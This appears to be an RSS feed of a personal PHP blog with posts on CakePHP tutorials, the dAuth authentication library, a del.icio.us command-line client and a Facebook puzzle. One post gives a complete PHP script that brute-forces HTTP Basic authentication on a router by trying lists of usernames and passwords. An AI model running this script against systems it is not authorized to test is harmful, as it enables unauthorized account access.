<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>php on Dieter&#39;s blog</title>
    <link>http://dieter.plaetinck.be/tags/php/</link>
    <description>Recent content in php on Dieter&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 12 Feb 2010 23:25:46 -0400</lastBuildDate>
    <atom:link href="/tags/php/" rel="self" type="application/rss+xml" />
    
    <item>
      <title>facebook usrbincrash php implementation</title>
      <link>http://dieter.plaetinck.be/post/facebook_usrbincrash_php_implementation/</link>
      <pubDate>Fri, 12 Feb 2010 23:25:46 -0400</pubDate>
      
      <guid>83 at http://dieter.plaetinck.be</guid>
      <description>&lt;p&gt;Implementation for Facebook &lt;a href=&#34;http://www.facebook.com/careers/puzzles.php?puzzle_id=2&#34;&gt;usr bin crash&lt;/a&gt; puzzle. (&lt;a href=&#34;http://dieter.plaetinck.be/not_working_for_facebook&#34;&gt;how/why&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;I haven&#39;t touched the code for a few months, but better to put it online then to let it rot.&lt;br /&gt;
&lt;a href=&#34;http://github.com/Dieterbe/facebookpuzzles/&#34; title=&#34;http://github.com/Dieterbe/facebookpuzzles/&#34;&gt;http://github.com/Dieterbe/facebookpuzzles/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2 branches:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;master: basically what I submitted to FB, and what just works&lt;/li&gt;
&lt;li&gt;withpruning: an attempt for futher optimalisation (it only improves the runtime in some cases) but I didn&#39;t finish that version and there&#39;s a bug in it somewhere&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the repo you&#39;ll also find various test input files supplied by the community on &lt;a href=&#34;http://www.facebook.com/topic.php?uid=15325934266&amp;amp;topic=5131&amp;amp;post=30091&#34;&gt;the forums&lt;/a&gt; and a script to benchmark the implementation on all inputfiles.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Announcing the Netlog Developer Pages</title>
      <link>http://dieter.plaetinck.be/post/announcing_the_netlog_developer_pages/</link>
      <pubDate>Sat, 24 May 2008 12:39:28 -0400</pubDate>
      
      <guid>43 at http://dieter.plaetinck.be</guid>
      <description>&lt;p&gt;At work, we&#39;ve setup the &lt;a href=&#34;http://netlog.com/go/developer&#34;&gt;Netlog Developer Pages&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It is the place where you can/will find all information around our OpenSocial implementation, our own API, skin development, sample code and so on.&lt;br /&gt;
We&#39;ve also launched a &lt;a href=&#34;http://en.netlog.com/go/developer/group&#34;&gt;group&lt;/a&gt; where you can communicate with fellow developers and Netlog employees.&lt;br /&gt;
The page also features a &lt;a href=&#34;http://en.netlog.com/go/developer/blog&#34;&gt;blog&lt;/a&gt; where you can follow what is going on in the Netlog Tech team.&lt;/p&gt;
&lt;p&gt;PS: We&#39;ve also updated our &lt;a href=&#34;http://en.netlog.com/go/inside/view=jobs&#34;&gt;jobs page&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hacking into my router by brute-forcing http authentication</title>
      <link>http://dieter.plaetinck.be/post/hacking_into_my_router_by_brute_force_http_authentication/</link>
      <pubDate>Wed, 28 Nov 2007 22:11:51 -0400</pubDate>
      
      <guid>34 at http://dieter.plaetinck.be</guid>
      <description>&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;:  Don&#39;t use this code for anything illegal!  I&#39;m not responsible for what you do with this!&lt;/p&gt;
{{&lt; highlight &#34;php&#34; &#34;style=default&#34; &gt;}}
&lt;?php
$host = &#39;&#39;;
$port = &#39;&#39;;
$url = &#39;/&#39;;
$users = array();
$passes = array();
tryme($host,$url,$port);
foreach($users as $user) {
   foreach($passes as $pass) {
      tryme($host,$url,$port,$user,$pass);
   }
}

function tryme($host,$url = &#39;/&#39;,$port = 80, $user = null,$pass =null ) {
   $result=&#34;FAIL&#34;;
   if(tryAccess($host,$url,$port, $user,$pass)) $result=&#34;SUCCESS&#34;;
   if($user &amp;&amp; $pass) $userpass = &#34;user $user pass $pass &#34;;
   else $userpass = &#34; without username &amp; password&#34;;
   echo(&#34;Tried $userpass &gt; $result\n&#34;);
}

function tryAccess($host,$url = &#39;/&#39;,$port = 80, $user = null,$pass =null)  {
   $fp = @fsockopen ($host, $port, &amp;$errno, &amp;$errdesc);
   if (!is_resource ($fp)) {
      echo(&#34;Could&#39;t not open socket to server: $errno - $errdesc\n&#34;);
      return false;
   }
   @fputs ($fp, &#34;POST $url HTTP/1.1\r\n&#34;);
   @fputs ($fp, &#34;Host: $host\r\n&#34;);
   @fputs ($fp, &#34;Connection: close\r\n&#34;);
   if($user &amp;&amp; $pass) {
      @fputs ($fp, &#34;Authorization: Basic &#34; . base64_encode (&#34;$user:$pass&#34;) . &#34;\r\n&#34;);
   }
   @fputs($fp,&#34;\r\n&#34;);
        
   $reply = &#39;&#39;;
   $success = true;
   while (!@feof ($fp)) {
      $line = @fgets ($fp, 1024);
      if(strpos($line,&#39;401 Unauthorized&#39;)) $success = false;
      $reply .= $line; 
   }
   @fclose ($fp);
   return $success;
}
?&gt;
{{&lt; /highlight &gt;}}
</description>
    </item>
    
    <item>
      <title>Bye CakePHP, bye dAuth... Hello Drupal!</title>
      <link>http://dieter.plaetinck.be/post/bye_cakephp_bye_dauth_hello_drupal/</link>
      <pubDate>Thu, 19 Jul 2007 00:34:51 -0400</pubDate>
      
      <guid>19 at http://dieter.plaetinck.be</guid>
      <description>, and although some of them have some specific requirements, in the end it&#39;s all very generic and a full blown content management system like Drupal proves much more useful and feature full then developing my own application in a web application framework such as Cake. (even if that&#39;s becoming easier and easier to do)&lt;/p&gt;
&lt;p&gt;I think Drupal is a magnificent CMS because it is plug and play (I need that because my time is getting pretty sparse lately!) but also because it has a pretty active community: there are so many 3rd party modules being developed, and usually you can just upload the module in your modules folder , enable it from your control panel and presto!&lt;/p&gt;
&lt;p&gt;Also Drupal seems to have a pretty slick API, this is important for me because I will still need to program some stuff every once in a while because not everything I need is available yet. &lt;/p&gt;
&lt;p&gt;If I would ever use Cake again, I would probably abuse it as a console application framework (especially for it&#39;s simple datalayer), or of course if I would have to create a very customized web application such as I did &lt;a href=&#34;http://dieter.plaetinck.be/masterproef&#34;&gt;recently&lt;/a&gt;, but none is planned in the forseeable future.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;A special note about dAuth:&lt;/em&gt;&lt;br /&gt;
CakePHP 1.2 will have an auth component included, I don&#39;t know the current state but as far as I know it&#39;s not (and never will be, judging my talks with a cake dev) as advanced as dAuth.  However, this is not necessarily a bad thing:&lt;br /&gt;
The further I&#39;ve tried to perfect the safeguarding of the confidentiality of the password (trough hashing it, using the challenge response paradigm, etc) the more I&#39;ve come to realize you can never get a perfect result on plain http using js/php.  Just switch to https and you get great encryption where you don&#39;t need to bother about the confidentiality of a password, and it&#39;s almost no hassle.  So these are things that shouldn&#39;t be in your php/js code, which saves you a lot of efforts and is perfectly secure (at least: the aspect of confidentiality!&lt;/p&gt;
&lt;p&gt;But.. another part of the system were the &#34;added bits&#34; of security such as the brute force detection.  I hope the cake guys will include something like that in their auth component because I think this is a must.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>dAuth</title>
      <link>http://dieter.plaetinck.be/post/dauth/</link>
      <pubDate>Mon, 02 Jul 2007 13:19:14 -0400</pubDate>
      
      <guid>22 at http://dieter.plaetinck.be</guid>
      <description>&lt;p&gt;dAuth is a secure authentication system for CakePHP.&lt;/p&gt;
&lt;p&gt;It uses techniques such as the challenge-response paradigm, customizable multiple-stage password hashing, brute force (hammering) detection, session hijacking prevention etc.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://bakery.cakephp.org/articles/view/introduction-to-dauth-v0-3&#34; onClick=&#34;javascript:urchinTracker(&#39;bakery.cakephp.org/articles/view/introduction-to-dauth-v0-3&#39;);&#34;&gt;Read all about it&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You can download the files separately on the before mentioned page or get the &lt;a href=&#34;http://letthemcodecake.com/learning-cakephp/dauth-v03-tarball/&#34; onClick=&#34;javascript:urchinTracker(&#39;letthemcodecake.com/learning-cakephp/dauth-v03-tarball/&#39;);&#34;&gt;tarball&lt;/a&gt; that somebody was kind enough to create.&lt;br /&gt;
(damn I&#39;m lazy today)&lt;/p&gt;
&lt;p&gt;I don&#39;t maintain this any more!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PhpDeliciousClient, a php cli client to administer del.icio.us accounts</title>
      <link>http://dieter.plaetinck.be/post/phpdeliciousclient_a_php_cli_client_to_administer_delicious_accounts/</link>
      <pubDate>Sun, 01 Jul 2007 16:52:51 -0400</pubDate>
      
      <guid>21 at http://dieter.plaetinck.be</guid>
      <description>&lt;p&gt;PhpDeliciousClient is a console based client for doing maintenance on Del.icio.us accounts.&lt;br /&gt;
I wrote it because - to my knowledge - there currently is no good program (including the personalized del.icio.us web page itself) that lets you make changes to your del.icio.us data in a powerful, productive manner. (with data I primarily mean tags. Posts and bundles are considered less important).&lt;/p&gt;
&lt;p&gt;You probably are familiar with the fact that a Delicious account (or any tag based meta data organizing system, for that matter) can soon become bloated:  It gets filled with way too many tags.  Among those tags several of them mean the same (fun, funny, humor, ...) or include the other (humor, jokes, ...)  You can group them in bundles but even then you need to add all the tags to a post if you want it to appear in the results for that tag.  Not very convenient. Also, if you have your del.icio.us bookmarks available in Firefox, you&#39;d have a menu with several hundreds of entries (one for each tag), each menu containing usually just a few (or worse: just one) entry.&lt;/p&gt;
&lt;p&gt;When I got in this situation I tried to fix it, but it was a hell of a task to do this on the Delicious webpage itself, and I although I found some other tools they were far to basic, outdated, dependent on other stuff or just not meant for this kind of task, so I decided to write my own.&lt;/p&gt;
&lt;p&gt;The result is a php command line program called &lt;a href=&#34;http://dieter.plaetinck.be/php_delicious_client&#34;&gt;PhpDeliciousClient&lt;/a&gt; (as you can see, I added it to the menu on the left too), which uses the &lt;a href=&#34;http://www.ejeliot.com/pages/php-delicious&#34;&gt;PhpDelicious&lt;/a&gt; library to access the Del.icio.us api.&lt;/p&gt;
&lt;p&gt;The primary focus of the program is to help you to bring your tags in balance, in an as efficient way as possible.  Other stuff, which can be done just fine on the delicious page (editing single posts, changing your password, ...) is not implemented.  &lt;/p&gt;
&lt;p&gt;It&#39;s a bit hacky, I don&#39;t give any guarantees but I can tell I used it to edit &lt;a href=&#34;http://del.icio.us/Dieter_be&#34;&gt;my own Del.icio.us page&lt;/a&gt;, going from about 400 tags to about 80 without any problems.&lt;/p&gt;
&lt;p&gt;That said, head over to &lt;a href=&#34;http://dieter.plaetinck.be/php_delicious_client&#34;&gt;the PhpDeliciousClient project page&lt;/a&gt; for some more information, and to download it ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PhpDeliciousClient</title>
      <link>http://dieter.plaetinck.be/post/php_delicious_client/</link>
      <pubDate>Fri, 29 Jun 2007 13:52:21 -0400</pubDate>
      
      <guid>20 at http://dieter.plaetinck.be</guid>
      <description>&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;PhpDeliciousClient is a CLI program for administering your Delicous account.  When you invoke it from the command line you have some methods to administer your tags and your posts.&lt;/p&gt;
&lt;p&gt;It&#39;s written in PHP and uses &lt;a href=&#34;http://www.ejeliot.com/&#34;&gt;Ed Eliot&#39;s&lt;/a&gt; &lt;a href=&#34;http://www.ejeliot.com/pages/php-delicious&#34;&gt;PhpDelicous&lt;/a&gt; class to contact the del.icio.us api. (included in download)&lt;br /&gt;
PhpDeliciousClient is licensed under the GPL v2, while the PhpDelicious class is licensed under the BSD license.&lt;/p&gt;
&lt;h3&gt;Why?&lt;/h3&gt;
&lt;p&gt;The main reason I started developing it is because administering your account on the del.ico.us web interface can be cumbersome.&lt;br /&gt;
This is especially true in the case of balancing your tags:&lt;br /&gt;
After a while, your del.icio.us account can get unbalanced: this is when you have many tags, but most of them only contain a few posts (very often even just one! ).&lt;br /&gt;
So you would want to balance them again, by deleting and renaming some very specific tags so that you get a collection consisting of less tags (who are more general) and contain about 10 ~ 30 posts each.  Maybe you even also want to delete or rename some general ones who have way to many associated posts.&lt;br /&gt;
If you want to do this via the del.icio.us web interface you could either go to your personal page, click a tag, and delete the tag manually from each associated post.  Or you could go to the delete or rename tag pages.  On these pages you have a form where you can select an existing tag from a dropdown (which usually is huge) and choose to delete or rename it (depending on which page you are on).  Then you would need to go to the form again and do this again for each tag.&lt;/p&gt;
&lt;p&gt;With this tool, you can get a list of tags with certain conditions.  Eg &#34;show me all tags who have between 1 and 3 associated posts&#34;.  You can then loop through that list and for each tag the tool will present you the option to delete, rename or skip it.&lt;/p&gt;
&lt;p&gt;Of course it can do more, but this was my focus: making balancing an account as pleasant as possible.  Other features, such as adding or editing single posts are considered less important as these things can be done just fine on the del.icio.us page.&lt;/p&gt;
&lt;h3&gt;Current state&lt;/h3&gt;
&lt;p&gt;Currently the tool seems to do what it is intended to (and pretty well, at least for me: I cleaned up my account from about 400 to 80 tags during development of this program).&lt;br /&gt;
However I don&#39;t give any warranty, the tool is only moderately documented, performs little to no user input checking and isn&#39;t very well tested so don&#39;t expect any higher quality then that of the average Microsoft product.&lt;br /&gt;
This program shouldn&#39;t empty your del.icio.us account or blow up your computer but if it does I cannot be held responsible.&lt;/p&gt;
&lt;h3&gt;Supported features&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[t] View Tag: Based on the name of tag you enter, you can see the associated posts and edit or rename the tag.&lt;/li&gt;
&lt;li&gt;[ts]  View Tags: Shows you all tags based on certain criteria:
&lt;ul&gt;
&lt;li&gt;lowerlimit: the minimum amount of times a tag has to be associated to a post&lt;/li&gt;
&lt;li&gt;upperlimit: the maximum amount of times a tag has to be associated to a post&lt;/li&gt;
&lt;li&gt;hard limit: the maximum number of tags you wish to edit/view at once&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can decide to view associated posts for each tag, and you can choose wether to only show the tags, or to present you a menu with options for each one.  I usually use the latter, along with associated posts viewing enabled.&lt;/li&gt;
&lt;li&gt;[p] View Post: shows you the first hit based on a tag and url*&lt;/li&gt;
&lt;li&gt;[ps] View Posts: shows you all posts based on a tag and url*&lt;/li&gt;
&lt;li&gt;[lu] Date of last update: Shows you the time when the data (on the serverside) last changed&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;*: url based searching is still buggy, I&#39;m working on it.&lt;/p&gt;
&lt;h3&gt;Plans for the future&lt;/h3&gt;
&lt;p&gt;My goals for upcoming releases are (aside from bug fixing) to add features to let you do stuff that you currently can&#39;t do or at least not in a productive manner.  &lt;/p&gt;
&lt;h4&gt;Known bugs to be fixed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;URL-based post querying doesn&#39;t work&lt;/li&gt;
&lt;li&gt;Timezone not taken into account or something like that, because the &#34;last updated&#34; date has a 2hrs offset for me&lt;/li&gt;
&lt;li&gt;During list iteration tags that have been renamed/deleted already still appear in posts for other tags&lt;/li&gt;
&lt;li&gt;Issue less load on the Del.icio.us webservice by using the updated date (gonna take a look at Ed&#39;s caching system for that)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Features I have on my mind&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Try to hide password as it is typed in by user&lt;/li&gt;
&lt;li&gt;When a tag has many associated posts, automatically show them more concisely&lt;/li&gt;
&lt;li&gt;An &#34;are you sure?&#34; thing when you want to rename to a tag that already has many (say: 40) associated posts&lt;/li&gt;
&lt;li&gt;A mode to only show tags that differ one letter, or differ several letters, as long as they have enough in common (say: 2/3, 1/2 or user configurable)&lt;/li&gt;
&lt;li&gt;An improved commandline that allows commands/queries like &#34;rm tag1 tag2 tag3&#34;
&lt;/ul&gt;
&lt;h3&gt;Prerequisites&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A shell (such as bash)&lt;/li&gt;
&lt;li&gt;PHP 4 or higher, with php-cli enabled (default)&lt;/li&gt;
&lt;li&gt;A del.icio.us account, preferrably a very messy one&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Download&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://users.edpnet.be/dieter/php_delicious_client_v05.zip&#34; onClick=&#34;javascript:urchinTracker (&#39;/files/php_delicious_client_v05.zip&#39;);&#34;&gt;release v0.5 (1-7-2007)&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Installation&lt;/h3&gt;
&lt;p&gt;Unpack the archive and put the directory somewhere on your system.  On Linux /usr/local/bin/ is usually a good choice.&lt;br /&gt;
Make sure pdclient.php has the executable flag (x).  If the directory is in your $PATH, you can just type pdclient.php on your console, otherwise you need to type &amp;lt;path to program&amp;gt;/phpdeliciousclient/pdclient.php or edit your $PATH.&lt;/p&gt;
&lt;p&gt;You could also create a symlink in a good directory: &lt;em&gt;ln -s &amp;lt;path to program&amp;gt;/phpdeliciousclient/pdclient.php /usr/local/bin/pdclient&lt;/em&gt;&lt;/p&gt;
&lt;h3&gt;Usage&lt;/h3&gt;
&lt;p&gt;I choose a mysql-like syntax for invoking the program.  Valid options are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;pdclient.php&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;pdclient.php --help&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;pdclient.php --user &amp;lt;delicious username&amp;gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;pdclient.php --user &amp;lt;delicious username&amp;gt; --password&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;pdclient.php --user &amp;lt;delicious username&amp;gt; --password &amp;lt;delicious password&amp;gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;With method #4, the program will ask your password upon execution.  With the other methods this doesn&#39;t happen.  You can always update your account information from the menu. (&lt;em&gt;account setup&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;In the program prompt you can always type &#39;h&#39; to get help.  Aside from that, just try the options, you&#39;ll figure it out in no time.&lt;/p&gt;
&lt;h3&gt;Bug reports &amp;amp; feature requests&lt;/h3&gt;
&lt;p&gt;You can report bugs or file feature requests through the comment system on this page. Choose an appropriate title and prefix it with &#34;Bug: &#34; or &#34;Feature: &#34;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Drag &#39;n drop tutorial with the CakePHP 1.2 Ajax helper, Prototype framework and Scriptaculous library</title>
      <link>http://dieter.plaetinck.be/post/drag_n_drop_tutorial_with_cakephp_ajax_prototype_scriptaculous/</link>
      <pubDate>Tue, 29 May 2007 21:25:13 -0400</pubDate>
      
      <guid>15 at http://dieter.plaetinck.be</guid>
      <description>&lt;h3&gt;Prerequisites&lt;/h3&gt;
&lt;p&gt;CakePHP.  I used 1.2 but I think this will work on 1.1 too (because the Ajax helper is in there for a long time.  it&#39;s even fully documented in the 1.1 manual)&lt;br /&gt;
Scriptaculous &amp;amp; Protoype libraries.  See &lt;a href=&#34;http://manual.cakephp.org/chapter/helpers&#34;&gt;the cake manual&lt;/a&gt; on how to install these.  Don&#39;t close this page after installing the libs, because it also explains the possibilities of the Ajax helper and is a reference that you &lt;em&gt;will&lt;/em&gt; need!  The &lt;a href=&#34;http://api.cakephp.org/1.2/class_ajax_helper.html&#34;&gt;api reference&lt;/a&gt; reveals even more possibilities, but the former page should do.&lt;/p&gt;
&lt;h3&gt;Let&#39;s get started!&lt;/h3&gt;
&lt;p&gt;Instead of showing a really simple example, I&#39;ll give a skeleton example based on a webstore-scenario.  You can have multiple articles (draggables) and 2 droppables: a cart and a thrashbin.  Dropping an article in the cart adds the article to your order (which I usually keep in the session) and updates the view accordingly, dragging it from the cart into the thrashbin removes it from the session and updates the view too.&lt;br /&gt;
I&#39;ve left out the basics such as sql, models and controller business logic, and focused on the Ajax specifics.&lt;/p&gt;
&lt;p&gt;The view-code can be combined in different elements but for simplicity let&#39;s assume there is only 1 view file.&lt;br /&gt;
Keep in mind that each object where you want to assign some functionality to (such as draggable, droppable) must have a unique DOM id.  It doesn&#39;t matter if it&#39;s a div or span or p or whatever, as long as it has a unique id.&lt;/p&gt;
&lt;p&gt;The view looks like this:&lt;/p&gt;
{{&lt; highlight &#34;html+php&#34; &#34;style=default&#34; &gt;}}
&lt;?php foreach($articles as $article): ?&gt;
&lt;div id=&#34;&lt;?php echo $article[&#39;Article&#39;][&#39;id&#39;]; ?&gt;&#34;&gt;
   &lt;?php echo $article[&#39;Article&#39;][&#39;description&#39;]; ?&gt;
&lt;/div&gt;
&lt;?php echo $ajax-&gt;drag($article[&#39;Article&#39;][&#39;id&#39;],array(&#39;revert&#39;=&gt;true)); ?&gt;
/*
   the revert thing will make the draggable return to it&#39;s original position.  Set this to false and the object will stay where you put it.
   This does not have anything to do with a function call being made btw, that&#39;s the job for the draggables
*/
&lt;?php endforeach; ?&gt;


&lt;div id=&#34;cart&#34;&gt;
   &lt;?php echo $this-&gt;requestAction(&#39;/controller/showcart&#39;); ?&gt; // this call is not necessary.  You can use it to fill the &lt;div&gt; with some content to start with
&lt;/div&gt;

&lt;div id=&#34;thrashbin&#34;&gt;
&lt;/div&gt;

&lt;?php
   echo $ajax-&gt;dropRemote(&#39;cart&#39;,null,array(&#39;url&#39; =&gt; &#39;/controller/addarticle/&#39;,&#39;with&#39;=&gt;&#39;{draggedid:element.id}&#39;,&#39;update&#39;=&gt;&#39;cart&#39;));
   echo $ajax-&gt;dropRemote(&#39;thrashbin&#39;,null,array(&#39;url&#39; =&gt; &#39;/controller/removearticle/&#39;,&#39;with&#39;=&gt;&#39;{draggedid:element.id}&#39;,&#39;update&#39;=&gt;&#39;cart&#39;));
?&gt;
/*
   these two calls make objects with DOM id&#39;s &#39;cart&#39; and &#39;thrashbin&#39; droppable.  When an object is dropped into them, the actions defined by &#39;url&#39; are called.
   The &#39;with&#39;=&gt;&#39;{draggedid:element.id} passes the id of the dropped element to the function that is called (on the background, no page refresh or anything like that!).
   The update thing makes sure that the entire output of the requestAction call is displayed inside the &lt;div id=&#34;cart&#34;&gt;&lt;/div&gt;.
   So that means that the page will update the part of the page which is specified (dom id &#39;cart&#39;) when the output from the requestAction call is received
*/
{{&lt; /highlight &gt;}}&lt;p&gt;
The controller would have functions like this:&lt;/p&gt;
{{&lt; highlight &#34;html+php&#34; &#34;style=default&#34; &gt;}}
&lt;?php

// this function can be used to show initial contents of the cart.
function showcart(){
    $this-&gt;set(&#39;articles&#39;,false); /* no articles bought yet */
    $this-&gt;render(&#39;cart&#39;);
    // (read on to find out more about this view)
}

function addarticle(){
/*
   The DOM id of the element that has been dragged into here can be found in $this-&gt;params[&#39;form&#39;][&#39;draggedid&#39;].
   You can use that id to do something like $this-&gt;Article-&gt;findById() to add the article to the session.
   At the end of this function the entire contents of the &lt;strong&gt;view&lt;/strong&gt; file will be returned (and rendered inside the &lt;div&gt; with DOM id &#39;cart&#39;.)
   The layout won&#39;t be rendered, only the view, since this is an Ajax call (the difference is autodetected by Cakes RequestHandler) 
   You could do something like this:
*/
   $this-&gt;set(&#39;articles&#39;, $all_bought_articles_from_the_session);
   $this-&gt;render(&#39;cart&#39;);
}

// this function is similar to the one above but instead removes one article from the session and renders the same view ;-)
function removearticle(){
}
?&gt;
{{&lt; /highlight &gt;}}&lt;p&gt;
The view controller/cart.ctp could look something like this:&lt;/p&gt;
{{&lt; highlight &#34;html+php&#34; &#34;style=default&#34; &gt;}}
&lt;ul&gt;
&lt;?php foreach($articles as $artikel):?&gt;
&lt;li&gt;&lt;?php echo $article[&#39;Article&#39;][&#39;id&#39;]; ?&gt;&lt;/li&gt;
&lt;?php endforeach; ?&gt;
&lt;/ul&gt;

&lt;?php if(!$articles) echo &#34;No articles in the cart!&#34;; ?&gt;
{{&lt; /highlight &gt;}}&lt;p&gt;
There you have it.  All explanations are inside the sources, I hope it&#39;s clear enough.  If not, just ask :-)&lt;/p&gt;
&lt;h3&gt;Common misconceptions&lt;/h3&gt;
&lt;p&gt;From reading many (outdated?) articles about Ajax in cake I noted a lot of information that was not correct.  Here they are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It is &lt;em&gt;not&lt;/em&gt; necessary to explicity pass the &#39;ajax&#39; layout as an argument to the render call.  Eg you don&#39;t need to do this:  $this-&gt;render(&#39;cart&#39;, &#39;ajax&#39;);  You can do $this-&gt;render(&#39;cart&#39;); (or even no explicit render call at all, if the view file is the same as the action name of your controller) Cakes RequestHandler automatically detects when it&#39;s dealing with an ajax call, and in that case won&#39;t render the layout, only the view.&lt;/li&gt;
&lt;li&gt;It is &lt;em&gt;not&lt;/em&gt; necessary to declare the UTF-8 character encoding in your layout or view&lt;/li&gt;
&lt;li&gt;You &lt;em&gt;don&#39;t&lt;/em&gt; need $this-&gt;autoRender =false; in the controller.  Unless maybe you absolutely don&#39;t want to render anything.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;The end&lt;/h3&gt;
&lt;p&gt;There you have it.  I hope everything is clear.  If not, ask on !&lt;/p&gt;
&lt;p&gt;For those who don&#39;t have it already, I really recommend &lt;a href=&#34;http://www.getfirebug.com/&#34;&gt;The firebug firefox extension&lt;/a&gt;.  Not only is it a great aid when designing, it&#39;s also perfectly suited for debugging Ajax calls.  It can show you exactly what happens when you drag an item in a droppable, what request is being made, what is being returned, etc.&lt;br /&gt;
This is explained in this movie:&lt;a href=&#34;http://www.youtube.com/watch?v=W4jXAaEMp2M&#34;&gt;Introduction to Debugging AJAX Application with Firebug&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Figuring out CakePHP&#39;s new AuthComponent</title>
      <link>http://dieter.plaetinck.be/post/figuring_out_cakephp_new_authcomponent/</link>
      <pubDate>Sat, 07 Apr 2007 15:52:48 -0400</pubDate>
      
      <guid>9 at http://dieter.plaetinck.be</guid>
      <description>For this first post it will be more trying to decipher the source code, messing with it will probably for a little later on.&lt;br /&gt;
Disclaimer: not everything I&#39;ll say here will be correct, first of all because I&#39;m not able to fully understand every piece of the source code (yet), secondly because the 1.2 api is still changing.&lt;/p&gt;
&lt;p&gt;The version i use for this post is svn head. (revision 4758 at time of writing)&lt;/p&gt;
&lt;h3&gt;The header&lt;/h3&gt;
&lt;p&gt;So let&#39;s just open &lt;a href=&#34;http://api.cakephp.org/1.2/auth_8php-source.html&#34;&gt;cake/libs/controller/components/auth.php&lt;/a&gt;.&lt;br /&gt;
Reading the first comment we immediately see &#34;Manages user logins and permissions.&#34;  This looks very important to me.  Seems like this component handles both authentication and access control.  It seems like the AuthComponent is able to interact with  the &lt;a href=&#34;http://manual.cakephp.org/chapter/acl&#34;&gt;ACL&lt;/a&gt; system that we know from the 1.1 branch.  Multiple uses of the AclComponent ($this-&gt;Acl inside the component) confirm this.&lt;/p&gt;
&lt;h3&gt;Member variables&lt;/h3&gt;
&lt;p&gt;The AuthComponent has quite some member variables, the most important ones seem to me:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;$userModel&lt;/strong&gt; (aro&#39;s) &amp;amp; &lt;strong&gt;$objectModel&lt;/strong&gt; (aco&#39;s)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$loginAction&lt;/strong&gt;:  url for login action, null by default but we should set this (to something like &#39;users/login&#39;) when we want to use the component in our application. As usual AppController&#39;s beforeFilter() seems like a good place for that.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$validate&lt;/strong&gt;:  set to &#39;actions&#39; or &#39;objects&#39;, depending on what you want to check the access for.  Actually there are more options, read on.  However: on first sight it seems like combinations of objects-actions aren&#39;t possible...Anyone knows more about this?&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$_loggedIn&lt;/strong&gt;:  true/false&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$allowedActions&lt;/strong&gt;: no user validation on these actions&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Functions&lt;/h3&gt;
&lt;p&gt;Now, let&#39;s move on to the available functions (the most important ones that is) ...&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;initialize(&amp;amp;$controller)&lt;/strong&gt; seems to be a new ( in 1.2) callback.&lt;br /&gt;
Dispatcher calls $controller-&gt;_initComponents(), which (controller.php) in turn calls $component-&gt;init($this), which calls $tempComponent-&gt;initialize($controller).&lt;br /&gt;
So this function is called automatically, and when that happens $controller-&gt;params are all copied to $this-&gt;params (by value).  Some more stuff happens but I don&#39;t think it&#39;s very important at this time.&lt;/li&gt;
&lt;li&gt;The &lt;strong&gt;startup(&amp;amp;$controller)&lt;/strong&gt; callback is familiar to 1.1 users.  It is called in the startup-phase of the component, shortly after the initialize callback.  What happens here?
&lt;ul&gt;
&lt;li&gt;The password in $controller-&gt;data is hashed by using a call to &#34;Security::hash(CAKE_SESSION_STRING . $password)&#34;. (called via $this-&gt;hashPasswords() which calls $this-&gt;password().&lt;br /&gt;
After that $this-&gt;data = $controller-&gt;data;&lt;/li&gt;
&lt;li&gt;A check whether ($this-&gt;allowedActions == array(&#39;*&#39;) || in_array($controller-&gt;action, $this-&gt;allowedActions)).&lt;br /&gt;
In this case no further processing is needed: access is granted, i don&#39;t know why we return false here, though&lt;/li&gt;
&lt;li&gt;Then we have 2 cases:&lt;br /&gt;
Either we are at the login action (defined by $loginAction like mentioned earlier), or we are somewhere else.  I think it will be clear what happens when you study the code, but I do think it&#39;s important to mention that the actual login happens at line 274 ($this-&gt;login($data), function definition at 470).&lt;br /&gt;
The identify function at line 624 is important too.  I guess this one checks the credentials.&lt;br /&gt;
